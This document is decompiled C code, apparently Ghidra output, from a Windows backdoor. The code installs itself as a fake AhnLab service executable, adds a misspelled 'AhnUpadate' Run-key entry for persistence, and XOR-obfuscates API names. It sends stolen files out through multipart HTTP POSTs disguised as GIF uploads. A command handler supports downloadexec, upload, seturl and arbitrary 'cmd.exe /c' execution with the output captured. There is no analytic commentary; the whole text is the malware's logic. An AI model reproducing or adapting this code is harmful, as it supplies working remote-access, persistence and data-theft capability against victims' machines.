  ppcStack_24 = (char **)0x403a3f;
  iVar1 = (*DAT_00419f5c)();
  if (iVar1 == 0) {
    ppcStack_24 = &pcStack_1c;
    puStack_28 = &stack0xffffffec;
    uStack_2c = 0;
    pcStack_1c = (char *)0x8;
    iVar1 = (*DAT_00419f40)();
    if (iVar1 == 0) {
      uStack_40 = 0x403a91;
      FUN_00406120((void *)0x8,(int)&uStack_2c);
      uStack_40 = 0;
      uStack_44 = 0;
      uStack_48 = 0;
      puStack_4c = &DAT_00416018;
      DAT_00419450 = uStack_2c;
      DAT_0041a138 = 0;
      DAT_0041a13c = 0;
      iVar1 = (*DAT_00419f40)(0);
      if (iVar1 != 0) {
        (*DAT_0041a144)(uStack_48);
        return 1;
      }
      _Src = _malloc((size_t)puStack_4c);
      uVar2 = 0;
      this = (void *)0x0;
      iVar1 = (*DAT_00419f40)(uStack_48,&DAT_00416018,0,0,_Src,&puStack_4c);
      if (iVar1 != 0) {
        (*DAT_0041a144)(uVar2);
        return 1;
      }
      FUN_00406120(this,(int)_Src);
      _memcpy(&DAT_00419050,_Src,(size_t)this);
      return 0;
    }
    uStack_40 = 0x403a76;
    (*DAT_0041a144)();
  }
  return 2;
}



undefined4 FUN_00403b50(void)

{
  int iVar1;
  undefined4 uVar2;
  char *pcStack_14;
  undefined *puStack_10;
  undefined local_c [12];
  
  puStack_10 = local_c;
  pcStack_14 = "Network";
  uVar2 = 0x80000001;
  iVar1 = (*DAT_00419f5c)(0x80000001);
  if (iVar1 == 0) {
    pcStack_14 = DAT_00419450;
    puStack_10 = (undefined *)DAT_0041a138;
    FUN_00406120((void *)0x8,(int)&pcStack_14);
    iVar1 = (*DAT_0041a130)(uVar2,&DAT_00416014,0,3,&pcStack_14,8);
    if (iVar1 == 0) {
      (*DAT_0041a144)(uVar2);
      return 0;
    }
    (*DAT_0041a144)(uVar2);
  }
  return 2;
}



undefined4 FUN_00403be0(void)

{
  char *pcVar1;
  char cVar2;
  int iVar3;
  char *pcVar4;
  char *pcVar5;
  char *pcVar6;
  undefined *puVar7;
  char *pcVar8;
  undefined *puStack_40c;
  undefined local_404 [1028];
  
  puStack_40c = local_404;
  pcVar8 = "Network";
  pcVar6 = (char *)0x0;
  iVar3 = (*DAT_00419f5c)(0x80000001,"Network");
  if (iVar3 == 0) {
    pcVar5 = &DAT_00419050;
    cVar2 = DAT_00419050;
    while (cVar2 != '\0') {
      pcVar4 = pcVar5;
      do {
        cVar2 = *pcVar4;
        pcVar4 = pcVar4 + 1;
      } while (cVar2 != '\0');
      pcVar6 = pcVar4 + (int)(pcVar6 + (1 - (int)(pcVar5 + 1)));
      pcVar4 = pcVar5;
      do {
        cVar2 = *pcVar4;
        pcVar4 = pcVar4 + 1;
      } while (cVar2 != '\0');
      pcVar1 = pcVar5 + (int)(pcVar4 + (1 - (int)(pcVar5 + 1)));
      pcVar5 = pcVar5 + (int)(pcVar4 + (1 - (int)(pcVar5 + 1)));
      cVar2 = *pcVar1;
    }
    pcVar6 = pcVar6 + 1;
    _memcpy(&puStack_40c,&DAT_00419050,(size_t)pcVar6);
    FUN_00406120(pcVar6,(int)&puStack_40c);
    puVar7 = &DAT_00416018;
    iVar3 = (*DAT_0041a130)(pcVar8,&DAT_00416018,0,3,&puStack_40c,pcVar6);
    if (iVar3 == 0) {
      (*DAT_0041a144)(puVar7);
      return 1;
    }
    (*DAT_0041a144)(puVar7);
  }
  return 2;
}



undefined4 FUN_00403cc0(void)

{
  char cVar1;
  LSTATUS LVar2;
  HANDLE hFile;
  DWORD nNumberOfBytesToRead;
  void *pvVar3;
  HANDLE hFile_00;
  undefined4 *puVar4;
  int iVar5;
  undefined4 *puVar6;
  HKEY local_118;
  DWORD DStack_114;
  int local_110;
  DWORD DStack_10c;
  void *pvStack_108;
  HANDLE pvStack_104;
  undefined4 uStack_100;
  
  local_110 = 0;
  LVar2 = RegOpenKeyA((HKEY)0x80000002,"SYSTEM\\ControlSet001\\Services\\V3 Service",&local_118);
  if (LVar2 == 0) {
    RegCloseKey(local_118);
    return 0;
  }
  GetModuleFileNameA((HMODULE)0x0,(LPSTR)&uStack_100,0x100);
  CreateDirectoryA("C:\\ProgramData\\AhnLab",(LPSECURITY_ATTRIBUTES)0x0);
  pvStack_104 = (HANDLE)GetLastError();
  hFile = CreateFileA((LPCSTR)&uStack_100,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0
                     );
  if (hFile != (HANDLE)0xffffffff) {
    nNumberOfBytesToRead = GetFileSize(hFile,(LPDWORD)0x0);
    pvVar3 = operator_new(nNumberOfBytesToRead);
    pvStack_108 = pvVar3;
    if ((pvStack_104 == (HANDLE)0x0) || (pvStack_104 == (HANDLE)0xb7)) {
      hFile_00 = CreateFileA("C:\\ProgramData\\AhnLab\\AhnSvc.exe",0x40000000,3,
                             (LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
      if (hFile_00 == (HANDLE)0xffffffff) {
        return 0;
      }
      ReadFile(hFile,pvVar3,nNumberOfBytesToRead,&DStack_114,(LPOVERLAPPED)0x0);
      WriteFile(hFile_00,pvVar3,nNumberOfBytesToRead,&DStack_114,(LPOVERLAPPED)0x0);
      DStack_10c = GetTickCount();
      WriteFile(hFile_00,&DStack_10c,4,&DStack_114,(LPOVERLAPPED)0x0);
      puVar4 = (undefined4 *)"\"C:\\ProgramData\\AhnLab\\AhnSvc.exe\" /run";
      puVar6 = &uStack_100;
      for (iVar5 = 10; iVar5 != 0; iVar5 = iVar5 + -1) {
        *puVar6 = *puVar4;
        puVar4 = puVar4 + 1;
        puVar6 = puVar6 + 1;
      }
      local_110 = 1;
    }
    else {
      hFile_00 = pvStack_104;
      if (pvStack_104 == (HANDLE)0x3) {
        CreateDirectoryA("C:\\Program Files\\Common Files\\AhnLab",(LPSECURITY_ATTRIBUTES)0x0);
        hFile_00 = CreateFileA("C:\\Program Files\\Common Files\\AhnLab\\AhnSvc.exe",0x40000000,3,
                               (LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
        if (hFile_00 == (HANDLE)0xffffffff) {
          return 0;
        }
        ReadFile(hFile,pvVar3,nNumberOfBytesToRead,&DStack_114,(LPOVERLAPPED)0x0);
        WriteFile(hFile_00,pvVar3,nNumberOfBytesToRead,&DStack_114,(LPOVERLAPPED)0x0);
        DStack_10c = GetTickCount();
        WriteFile(hFile_00,&DStack_10c,4,&DStack_114,(LPOVERLAPPED)0x0);
        puVar4 = (undefined4 *)"\"C:\\Program Files\\Common Files\\AhnLab\\AhnSvc.exe\" /run";
        puVar6 = &uStack_100;
        for (iVar5 = 0xd; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar6 = *puVar4;
          puVar4 = puVar4 + 1;
          puVar6 = puVar6 + 1;
        }
        *(undefined2 *)puVar6 = *(undefined2 *)puVar4;
        *(undefined *)((int)puVar6 + 2) = *(undefined *)((int)puVar4 + 2);
        local_110 = 1;
      }
    }
    pvVar3 = pvStack_108;
    CloseHandle(hFile);
    CloseHandle(hFile_00);
    FUN_00406bc9(pvVar3);
    LVar2 = RegOpenKeyA((HKEY)0x80000002,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        &local_118);
    if ((LVar2 == 0) ||
       (LVar2 = RegOpenKeyA((HKEY)0x80000001,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                            &local_118), LVar2 == 0)) {
      puVar4 = &uStack_100;
      do {
        cVar1 = *(char *)puVar4;
        puVar4 = (undefined4 *)((int)puVar4 + 1);
      } while (cVar1 != '\0');
      LVar2 = RegSetValueExA(local_118,"AhnUpadate",0,1,(BYTE *)&uStack_100,
                             (int)puVar4 - ((int)&uStack_100 + 1));
      RegCloseKey(local_118);
      if (LVar2 != 0) {
        RegOpenKeyA((HKEY)0x80000001,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&local_118)
        ;
        puVar4 = &uStack_100;
        do {
          cVar1 = *(char *)puVar4;
          puVar4 = (undefined4 *)((int)puVar4 + 1);
        } while (cVar1 != '\0');
        LVar2 = RegSetValueExA(local_118,"AhnUpadate",0,1,(BYTE *)&uStack_100,
                               (int)puVar4 - ((int)&uStack_100 + 1));
        RegCloseKey(local_118);
        if (LVar2 != 0) {
          return 0;
        }
      }
      if (local_110 != 0) {
        WinExec((LPCSTR)&uStack_100,0);
        return 0;
      }
    }
    else {
      RegCloseKey(local_118);
    }
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_00403fb0(void)

{
  char cVar1;
  int iVar2;
  DWORD DVar3;
  int iVar4;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00413bc0;
  local_10 = ExceptionList;
  local_8 = 0;
  ExceptionList = &local_10;
  FUN_00402ca0();
  FUN_004023b0();
  _DAT_0041a168 = CreateMutexA((LPSECURITY_ATTRIBUTES)0x0,1,"345rdxcvgt567yhjm");
  _DAT_0041a17c = 0;
  FUN_004020b0();
  iVar2 = FUN_00403710();
  if (iVar2 == 0) {
    FUN_00403630();
    DAT_00419f38 = &DAT_00419050;
    while (*DAT_00419f38 != '\0') {
      DAT_00419f38 = (char *)FUN_00402090();
      do {
        cVar1 = *DAT_00419f38;
        DAT_00419f38 = DAT_00419f38 + 1;
      } while (cVar1 != '\0');
    }
    iVar2 = FUN_00403a20();
    if (iVar2 == 2) {
      DVar3 = GetTickCount();
      FUN_0040698a(DVar3);
      iVar4 = _rand();
      iVar2 = iVar4 / 300;
      DAT_00419450 = (iVar4 % 300 + 600) * 1000;
      DAT_0041a138 = 0;
      DAT_0041a13c = 0;
    }
    ExceptionList = local_10;
    return iVar2;
  }
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



undefined4 Catch_0040409b(void)

{
  int unaff_EBP;
  
  (*DAT_0041a2a0)(0);
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  return 0x40408a;
}



undefined4 __cdecl FUN_004040b0(undefined4 param_1,undefined4 param_2)

{
  undefined2 uVar1;
  int *in_EAX;
  int iVar2;
  HMODULE hModule;
  FARPROC pFVar3;
  FARPROC pFVar4;
  undefined4 *puVar5;
  undefined4 uStack_228;
  undefined4 uStack_224;
  undefined4 uStack_210;
  int iStack_20c;
  undefined2 uStack_208;
  undefined uStack_206;
  undefined auStack_1b0 [8];
  undefined auStack_1a8 [420];
  
  uStack_228 = 0x4040ca;
  iVar2 = (*DAT_00419f4c)();
  if ((iVar2 != 0) ||
     ((iStack_20c = (*DAT_00419f70)(), iStack_20c != -1 &&
      (iVar2 = (*DAT_00419f44)(&iStack_20c,4,2), iVar2 != 0)))) {
    uStack_228 = 0;
    iVar2 = (*DAT_0041a29c)(2,1);
    *in_EAX = iVar2;
    if (iVar2 == -1) {
      uStack_210 = 0x503d7c58;
      uStack_208 = 0x6363;
      iStack_20c = 0x6b213d3c;
      uStack_206 = 0;
      puVar5 = &uStack_210;
      do {
        *(byte *)puVar5 = *(byte *)puVar5 ^ 0xf;
        puVar5 = (undefined4 *)((int)puVar5 + 1);
      } while (*(byte *)puVar5 != 0);
      hModule = LoadLibraryA((LPCSTR)&uStack_210);
      uStack_210 = 0x5c4e5c58;
      uStack_206 = 0;
      iStack_20c = 0x7b7d6e7b;
      uStack_208 = 0x7f7a;
      puVar5 = &uStack_210;
      do {
        *(byte *)puVar5 = *(byte *)puVar5 ^ 0xf;
        puVar5 = (undefined4 *)((int)puVar5 + 1);
      } while (*(byte *)puVar5 != 0);
      pFVar3 = GetProcAddress(hModule,(LPCSTR)&uStack_210);
      uStack_210 = 0x4c4e5c58;
      iStack_20c = 0x616e6a63;
      uStack_208 = 0x7f7a;
      uStack_206 = 0;
      puVar5 = &uStack_210;
      do {
        *(byte *)puVar5 = *(byte *)puVar5 ^ 0xf;
        puVar5 = (undefined4 *)((int)puVar5 + 1);
      } while (*(byte *)puVar5 != 0);
      pFVar4 = GetProcAddress(hModule,(LPCSTR)&uStack_210);
      (*pFVar4)();
      iVar2 = (*pFVar3)(0x101,auStack_1a8);
      while (iVar2 != 0) {
        Sleep(1000);
        (*pFVar4)();
        iVar2 = (*pFVar3)(0x101,auStack_1b0);
      }
      return 2;
    }
    uStack_224 = 2;
    uVar1 = (*DAT_0041a14c)(0x50);
    uStack_228 = CONCAT22(uVar1,(undefined2)uStack_228);
    iVar2 = (*DAT_00419f64)(*in_EAX,&uStack_228,0x10);
    if (iVar2 != -1) {
      iVar2 = (*DAT_00419f50)(*in_EAX,param_1,param_2,0);
      if (iVar2 == -1) {
        (*DAT_0041a18c)(*in_EAX);
        return 1;
      }
      return 0;
    }
    (*DAT_0041a18c)(*in_EAX);
  }
  return 1;
}



undefined4 __cdecl FUN_004042e0(undefined4 param_1,int param_2)

{
  char cVar1;
  char *pcVar2;
  uint *puVar3;
  int iVar4;
  uint *puVar5;
  char acStack_e73 [7];
  uint auStack_e6c [26];
  char acStack_e04 [224];
  char acStack_d24 [32];
  char acStack_d04 [992];
  char acStack_924 [32];
  char acStack_904 [992];
  char acStack_524 [32];
  char local_504;
  undefined local_503 [1283];
  
  iVar4 = DAT_00419f38;
  local_504 = '\0';
  _memset(local_503,0,0x3ff);
  GetTickCount();
  if (param_2 == 0) {
    return 1;
  }
  pcVar2 = (char *)(iVar4 + 7);
  iVar4 = (int)auStack_e6c - (int)pcVar2;
  do {
    cVar1 = *pcVar2;
    pcVar2[iVar4] = cVar1;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  puVar3 = FUN_00406820(auStack_e6c,'/');
  if (puVar3 != (uint *)0x0) {
    puVar5 = puVar3;
    do {
      cVar1 = *(char *)puVar5;
      (acStack_e04 + -(int)puVar3)[(int)puVar5] = cVar1;
      puVar5 = (uint *)((int)puVar5 + 1);
    } while (cVar1 != '\0');
    *(undefined *)puVar3 = 0;
  }
  acStack_d04[0] = '\0';
  _memset(acStack_d04 + 1,0,0x3ff);
  _sprintf(acStack_d04,
           "-----------------------------%x\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"test.gif\"\r\nContent-Type: text/plain\r\n\r\n"
          );
  acStack_904[0] = '\0';
  _memset(acStack_904 + 1,0,0x3ff);
  _sprintf(acStack_904,
           "\r\n-----------------------------%x\r\nContent-Disposition: form-data; name=\"topic\"\r\n\r\n%d\r\n-----------------------------%x\r\nContent-Disposition: form-data; name=\"tag\"\r\n\r\n%s\r\n-----------------------------%x--\r\n"
          );
  pcVar2 = acStack_d04;
  do {
    cVar1 = *pcVar2;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  pcVar2 = acStack_904;
  do {
    cVar1 = *pcVar2;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  _sprintf(&local_504,
           "POST %s HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\r\nHost: %s\r\nPragma: no-cache\r\nContent-Type: multipart/form-data; boundary=---------------------------%x\r\nContent-Length: %d\r\n\r\n"
          );
  iVar4 = (*DAT_00419f4c)();
  if (iVar4 == 0) {
    iVar4 = (*DAT_00419f70)();
    if (iVar4 == -1) {
      return 1;
    }
    iVar4 = (*DAT_00419f44)();
    if (iVar4 == 0) {
      return 0;
    }
  }
  FUN_004068f4("80");
  (*DAT_0041a14c)();
  iVar4 = (*DAT_0041a29c)();
  if (iVar4 != -1) {
    Sleep(3000);
    iVar4 = (*DAT_00419f64)();
    if (iVar4 != -1) {
      pcVar2 = acStack_524;
      do {
        cVar1 = *pcVar2;
        pcVar2 = pcVar2 + 1;
      } while (cVar1 != '\0');
      iVar4 = (*DAT_00419f50)();
      if (iVar4 != -1) {
        pcVar2 = acStack_d24;
        do {
          cVar1 = *pcVar2;
          pcVar2 = pcVar2 + 1;
        } while (cVar1 != '\0');
        iVar4 = (*DAT_00419f50)();
        if ((iVar4 != -1) && (iVar4 = (*DAT_00419f50)(), iVar4 != -1)) {
          pcVar2 = acStack_924;
          do {
            cVar1 = *pcVar2;
            pcVar2 = pcVar2 + 1;
          } while (cVar1 != '\0');
          iVar4 = (*DAT_00419f50)();
          if (iVar4 != -1) {
            (*DAT_00419f58)();
            (*DAT_0041a18c)();
            return 1;
          }
        }
      }
    }
    (*DAT_0041a18c)();
  }
  return 0;
}



undefined4 __cdecl FUN_004045c0(LPCSTR param_1)

{
  char cVar1;
  undefined2 uVar2;
  char *pcVar3;
  uint *puVar4;
  HANDLE hFile;
  DWORD _Size;
  void *lpBuffer;
  int iVar5;
  uint *puVar6;
  DWORD DStack_d80;
  undefined2 uStack_d7c;
  undefined4 uStack_d78;
  undefined4 uStack_d74;
  undefined4 uStack_d70;
  undefined4 uStack_d6c;
  uint auStack_d68 [26];
  char acStack_d00 [224];
  char acStack_c20 [32];
  char acStack_c00 [992];
  char acStack_820 [32];
  char acStack_800 [992];
  char acStack_420 [32];
  char local_400;
  undefined local_3ff [1023];
  
  iVar5 = DAT_00419f38;
  local_400 = '\0';
  _memset(local_3ff,0,0x3ff);
  GetTickCount();
  pcVar3 = (char *)(iVar5 + 7);
  iVar5 = (int)auStack_d68 - (int)pcVar3;
  do {
    cVar1 = *pcVar3;
    pcVar3[iVar5] = cVar1;
    pcVar3 = pcVar3 + 1;
  } while (cVar1 != '\0');
  puVar4 = FUN_00406820(auStack_d68,'/');
  if (puVar4 != (uint *)0x0) {
    puVar6 = puVar4;
    do {
      cVar1 = *(char *)puVar6;
      (acStack_d00 + -(int)puVar4)[(int)puVar6] = cVar1;
      puVar6 = (uint *)((int)puVar6 + 1);
    } while (cVar1 != '\0');
    *(undefined *)puVar4 = 0;
  }
  hFile = CreateFileA(param_1,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    _Size = GetFileSize(hFile,(LPDWORD)0x0);
    lpBuffer = _malloc(_Size);
    if (lpBuffer == (void *)0x0) {
      return 0;
    }
    do {
      ReadFile(hFile,lpBuffer,_Size,&DStack_d80,(LPOVERLAPPED)0x0);
      _Size = _Size - DStack_d80;
    } while (_Size != 0);
    GetFileSize(hFile,(LPDWORD)0x0);
    acStack_c00[0] = '\0';
    _memset(acStack_c00 + 1,0,0x3ff);
    _sprintf(acStack_c00,
             "-----------------------------%x\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"scene.gif\"\r\nContent-Type: text/plain\r\n\r\n"
            );
    acStack_800[0] = '\0';
    _memset(acStack_800 + 1,0,0x3ff);
    _sprintf(acStack_800,
             "\r\n-----------------------------%x\r\nContent-Disposition: form-data; name=\"topic\"\r\n\r\n%d\r\n-----------------------------%x\r\nContent-Disposition: form-data; name=\"tag\"\r\n\r\n%s\r\n-----------------------------%x--\r\n"
            );
    pcVar3 = acStack_c00;
    do {
      cVar1 = *pcVar3;
      pcVar3 = pcVar3 + 1;
    } while (cVar1 != '\0');
    pcVar3 = acStack_800;
    do {
      cVar1 = *pcVar3;
      pcVar3 = pcVar3 + 1;
    } while (cVar1 != '\0');
    _sprintf(&local_400,
             "POST %s HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\r\nHost: %s\r\nPragma: no-cache\r\nContent-Type: multipart/form-data; boundary=---------------------------%x\r\nContent-Length: %d\r\n\r\n"
            );
    uStack_d78 = 0;
    uStack_d74 = 0;
    uStack_d70 = 0;
    uStack_d6c = 0;
    iVar5 = (*DAT_00419f4c)();
    if (iVar5 == 0) {
      iVar5 = (*DAT_00419f70)();
      if (iVar5 == -1) {
        return 1;
      }
      iVar5 = (*DAT_00419f44)();
      if (iVar5 == 0) {
        return 0;
      }
    }
    uStack_d7c = 2;
    uStack_d78 = *(undefined4 *)**(undefined4 **)(iVar5 + 0xc);
    FUN_004068f4("80");
    uVar2 = (*DAT_0041a14c)();
    DStack_d80 = CONCAT22(uVar2,(undefined2)DStack_d80);
    iVar5 = (*DAT_0041a29c)();
    if (iVar5 != -1) {
      iVar5 = (*DAT_00419f64)();
      if (iVar5 != -1) {
        pcVar3 = acStack_420;
        do {
          cVar1 = *pcVar3;
          pcVar3 = pcVar3 + 1;
        } while (cVar1 != '\0');
        iVar5 = (*DAT_00419f50)();
        if (iVar5 != -1) {
          pcVar3 = acStack_c20;
          do {
            cVar1 = *pcVar3;
            pcVar3 = pcVar3 + 1;
          } while (cVar1 != '\0');
          iVar5 = (*DAT_00419f50)();
          if ((iVar5 != -1) && (iVar5 = (*DAT_00419f50)(), iVar5 != -1)) {
            pcVar3 = acStack_820;
            do {
              cVar1 = *pcVar3;
              pcVar3 = pcVar3 + 1;
            } while (cVar1 != '\0');
            iVar5 = (*DAT_00419f50)();
            if (iVar5 != -1) {
              (*DAT_0041a18c)();
              return 1;
            }
          }
        }
      }
      (*DAT_0041a18c)();
    }
  }
  return 0;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

undefined4 FUN_004048e0(void **param_1)

{
  char cVar1;
  undefined2 uVar2;
  uint *puVar3;
  int iVar4;
  int iVar5;
  char *pcVar6;
  void **ppvVar7;
  undefined4 uVar8;
  UINT UVar9;
  uint *puVar10;
  BOOL BVar11;
  undefined4 *puVar12;
  char *pcVar13;
  undefined2 *puVar14;
  undefined4 *puVar15;
  __time64_t _Var16;
  undefined4 uStack_40e40;
  undefined4 uStack_40e3c;
  undefined4 uStack_40e38;
  undefined4 uStack_40e34;
  undefined4 uStack_40e30;
  undefined2 uStack_e41;
  undefined auStack_e3f [1023];
  undefined local_a40;
  undefined local_a3f [1023];
  char local_640 [504];
  char local_448 [519];
  undefined4 uStack_241;
  undefined local_236 [254];
  _STARTUPINFOA local_138;
  tm local_f0;
  undefined local_cc [4];
  undefined4 local_c8;
  undefined4 local_c4;
  undefined4 local_c0;
  undefined4 local_bc;
  _PROCESS_INFORMATION local_60;
  char *local_50;
  undefined4 *local_4c;
  _SECURITY_ATTRIBUTES local_48;
  HANDLE local_3c;
  uint *local_38;
  HANDLE local_34;
  DWORD local_30;
  int local_2c;
  char local_28;
  undefined4 uStack_27;
  undefined4 local_23;
  undefined local_1f;
  uint *local_1c;
  undefined4 uStack_18;
  undefined *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  ppvVar7 = param_1;
  puStack_c = &LAB_00413bb0;
  local_10 = ExceptionList;
  uStack_18 = 0x404903;
  local_14 = &stack0xfffbf1b0;
  local_8 = 0;
  param_1 = (void **)0x0;
  ExceptionList = &local_10;
  while (param_1 == (void **)0x0) {
    param_1 = (void **)_malloc((size_t)ppvVar7[1]);
    Sleep(100);
  }
  _memcpy(param_1,*ppvVar7,(size_t)ppvVar7[1]);
  local_28 = '\0';
  uStack_27 = 0;
  local_23 = 0;
  local_1f = 0;
  uStack_40e40 = uStack_40e40 & 0xffffff00;
  _memset((void *)((int)&uStack_40e40 + 1),0,0x3ffff);
  puVar3 = FUN_00406780((uint *)param_1,"interval");
  if (puVar3 == (uint *)0x0) {
    puVar3 = FUN_00406780((uint *)param_1,"wakeat");
    if (puVar3 == (uint *)0x0) {
      puVar3 = FUN_00406780((uint *)param_1,"update");
      if (puVar3 == (uint *)0x0) {
        puVar3 = FUN_00406780((uint *)param_1,"downloadexec ");
        if (puVar3 == (uint *)0x0) {
          puVar3 = FUN_00406780((uint *)param_1,"upload ");
          if (puVar3 == (uint *)0x0) {
            puVar3 = FUN_00406780((uint *)param_1,"seturl");
            if (puVar3 == (uint *)0x0) {
              _memset((void *)((int)&uStack_241 + 1),0,0x104);
              _memset(local_448,0,0x104);
              local_48.nLength = 0xc;
              local_48.lpSecurityDescriptor = (LPVOID)0x0;
              local_48.bInheritHandle = 1;
              CreatePipe(&local_34,&local_3c,&local_48,0x40000);
              _memset(&local_138,0,0x44);
              local_60.hProcess = (HANDLE)0x0;
              local_60.hThread = (HANDLE)0x0;
              local_60.dwProcessId = 0;
              local_60.dwThreadId = 0;
              local_138.cb = 0x44;
              local_138.hStdOutput = local_3c;
              local_138.hStdError = local_3c;
              local_138.dwFlags = 0x101;
              local_138.wShowWindow = 0;
              GetSystemDirectoryA((LPSTR)((int)&uStack_241 + 1),0x103);
              _sprintf(local_448,"%s\\cmd.exe /c %s",(int)&uStack_241 + 1);
              BVar11 = CreateProcessA((LPCSTR)0x0,local_448,(LPSECURITY_ATTRIBUTES)0x0,
                                      (LPSECURITY_ATTRIBUTES)0x0,1,0,(LPVOID)0x0,(LPCSTR)0x0,
                                      &local_138,&local_60);
              if (BVar11 != 0) {
                WaitForSingleObject(local_60.hProcess,0xffffffff);
                Sleep(100);
                CloseHandle(local_3c);
                local_30 = 0;
                do {
                  ReadFile(local_34,&uStack_40e40,0x40000,&local_30,(LPOVERLAPPED)0x0);
                } while (local_30 != 0);
              }
              CloseHandle(local_34);
            }
            else {
              puVar3 = FUN_00406820((uint *)param_1,' ');
              if (puVar3 != (uint *)0x0) {
                local_38 = FUN_00406820((uint *)((int)puVar3 + 1),' ');
              }
              if (local_38 != (uint *)0x0) {
                *(char *)local_38 = '\0';
              }
              pcVar6 = &DAT_00419050;
              local_50 = &DAT_00419050;
              puVar10 = local_38;
              while (pcVar13 = pcVar6, puVar3 != (uint *)0x0) {
                do {
                  puVar3 = (uint *)((int)puVar3 + 1);
                  cVar1 = *(char *)puVar3;
                  *pcVar13 = cVar1;
                  pcVar13 = pcVar13 + 1;
                } while (cVar1 != '\0');
                do {
                  cVar1 = *pcVar6;
                  pcVar6 = pcVar6 + 1;
                } while (cVar1 != '\0');
                puVar3 = puVar10;
                local_50 = pcVar6;
                if (puVar10 != (uint *)0x0) {
                  local_38 = FUN_00406820((uint *)((int)puVar10 + 1),' ');
                  puVar10 = local_38;
                }
              }
              iVar4 = FUN_00403be0();
              if (iVar4 == 1) {
                uStack_40e40 = 0x3a6c7275;
                uStack_40e3c = uStack_40e3c & 0xffffff00;
                pcVar6 = &DAT_00419050;
                puVar12 = &uStack_40e40;
                do {
                  puVar15 = puVar12;
                  puVar12 = (undefined4 *)((int)puVar15 + 1);
                } while (*(char *)puVar15 != '\0');
                while (local_4c = puVar15, *pcVar6 != '\0') {
                  _sprintf((char *)puVar15," %s");
                  do {
                    cVar1 = *pcVar6;
                    pcVar6 = pcVar6 + 1;
                    puVar12 = puVar15;
                  } while (cVar1 != '\0');
                  do {
                    puVar15 = puVar12;
                    puVar12 = (undefined4 *)((int)puVar15 + 1);
                  } while (*(char *)puVar15 != '\0');
                }
              }
            }
          }
          else {
            puVar3 = FUN_00406820((uint *)param_1,' ');
            if (puVar3 == (uint *)0x0) {
              uStack_40e40._0_1_ = 'U';
              uStack_40e40._1_1_ = 'p';
              uStack_40e40._2_1_ = 'l';
              uStack_40e40._3_1_ = 'o';
              uStack_40e3c._0_1_ = 'a';
              uStack_40e3c._1_1_ = 'd';
              uStack_40e3c._2_1_ = ':';
              uStack_40e3c._3_1_ = 'N';
              uStack_40e38._0_1_ = 'o';
              uStack_40e38._1_1_ = ' ';
              uStack_40e38._2_1_ = 'p';
              uStack_40e38._3_1_ = 'a';
              uStack_40e34._0_3_ = 0x6874;
            }
            else {
              iVar4 = FUN_004045c0((LPCSTR)((int)puVar3 + 1));
              if (iVar4 == 0) {
                uStack_40e40._0_1_ = 'U';
                uStack_40e40._1_1_ = 'p';
                uStack_40e40._2_1_ = 'l';
                uStack_40e40._3_1_ = 'o';
                uStack_40e3c._0_1_ = 'a';
                uStack_40e3c._1_1_ = 'd';
                uStack_40e3c._2_1_ = ' ';
                uStack_40e3c._3_1_ = 'F';
                uStack_40e38._0_1_ = 'a';
                uStack_40e38._1_1_ = 'i';
                uStack_40e38._2_1_ = 'l';
                uStack_40e38._3_1_ = '\0';
              }
              else {
                uStack_40e40._0_1_ = 'U';
                uStack_40e40._1_1_ = 'p';
                uStack_40e40._2_1_ = 'l';
                uStack_40e40._3_1_ = 'o';
                uStack_40e3c._0_1_ = 'a';
                uStack_40e3c._1_1_ = 'd';
                uStack_40e3c._2_1_ = ' ';
                uStack_40e3c._3_1_ = 'S';
                uStack_40e38._0_1_ = 'u';
                uStack_40e38._1_1_ = 'c';
                uStack_40e38._2_1_ = 'c';
                uStack_40e38._3_1_ = 'e';
                uStack_40e34._0_3_ = 0x7373;
              }
            }
          }
        }
        else {
          puVar3 = FUN_00406820((uint *)param_1,' ');
          if (puVar3 == (uint *)0x0) {
            uStack_40e40._0_1_ = 'D';
            uStack_40e40._1_1_ = 'o';
            uStack_40e40._2_1_ = 'w';
            uStack_40e40._3_1_ = 'n';
            uStack_40e3c._0_1_ = 'l';
            uStack_40e3c._1_1_ = 'o';
            uStack_40e3c._2_1_ = 'a';
            uStack_40e3c._3_1_ = 'd';
            uStack_40e38._0_1_ = 'E';
            uStack_40e38._1_1_ = 'x';
            uStack_40e38._2_1_ = 'e';
            uStack_40e38._3_1_ = 'c';
            uStack_40e34._0_1_ = ':';
            uStack_40e34._1_1_ = 'N';
            uStack_40e34._2_1_ = 'o';
            uStack_40e34._3_1_ = ' ';
            uStack_40e30._0_1_ = 'U';
            uStack_40e30._1_1_ = 'R';
            uStack_40e30._2_1_ = 'L';
            uStack_40e30._3_1_ = '\0';
          }
          else {
            GetTempPathA(0x100,(LPSTR)((int)&uStack_241 + 1));
            puVar12 = &uStack_241;
            do {
              puVar15 = puVar12;
              puVar12 = (undefined4 *)((int)puVar15 + 1);
            } while (*(char *)((int)puVar15 + 1) != '\0');
            *(undefined4 *)((int)puVar15 + 1) = 0x6e496b68;
            *(undefined4 *)((int)puVar15 + 5) = 0x652e7469;
            *(undefined2 *)((int)puVar15 + 9) = 0x6578;
            *(undefined *)((int)puVar15 + 0xb) = 0;
